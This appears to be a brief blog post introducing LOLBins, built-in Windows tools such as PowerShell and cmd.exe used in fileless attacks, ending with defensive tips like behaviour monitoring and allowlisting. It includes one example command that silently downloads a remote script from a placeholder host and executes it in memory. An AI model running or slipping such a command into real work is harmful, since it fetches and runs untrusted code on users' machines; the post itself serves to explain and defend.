New Blog Post: What Are LOLBins?

Most people think cyberattacks use viruses—but advanced hackers can attack without using any malware.

They use something called LOLBins: tools like PowerShell and cmd.exe that are already built into your computer.

Here's an example of a command that runs code without saving any files:

powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://example.com/script')"

These attacks are hard to detect because they look like normal admin activity. Defending against them means monitoring behavior—not just files.

How to Defend:

  • • Watch for unusual use of built-in tools like PowerShell
  • • Use application allowlisting
  • • Train users to spot odd system behavior
